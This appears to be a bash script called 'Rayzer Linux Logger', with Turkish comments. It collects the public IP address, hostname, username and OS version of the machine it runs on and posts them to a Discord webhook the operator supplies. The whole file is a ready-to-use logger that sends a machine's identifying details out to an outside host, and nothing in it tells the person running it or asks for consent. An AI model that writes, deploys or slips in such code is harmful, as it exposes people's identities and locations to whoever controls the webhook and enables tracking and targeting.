#!/bin/bash
# /source codes/execution/rayzer.sh

WEBHOOK_URL="PUT_WEBHOOK_HERE"

if [ "$WEBHOOK_URL" == "PUT_WEBHOOK_HERE" ]; then
    echo "Error: Webhook URL not set!"
    exit 1
fi

# Bilgileri Topla
IP=$(curl -s https://api.ipify.org || echo "Unknown")
HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(uname -sr)

# Discord JSON Payload
PAYLOAD=$(cat <<EOF
{
  "username": "Rayzer Linux Logger",
  "embeds": [{
    "title": "New Execution Log (Bash) ⚡",
    "color": 3447003,
    "fields": [
      { "name": "IP", "value": "\`$IP\`", "inline": true },
      { "name": "Machine", "value": "\`$HOSTNAME\`", "inline": true },
      { "name": "User", "value": "\`$USER\`", "inline": true },
      { "name": "OS", "value": "\`$OS\`", "inline": false }
    ],
    "footer": { "text": "Rayzer Execution System" },
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  }]
}
EOF
)

# Webhook'a Gönder
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$WEBHOOK_URL"
echo "Log sent!"
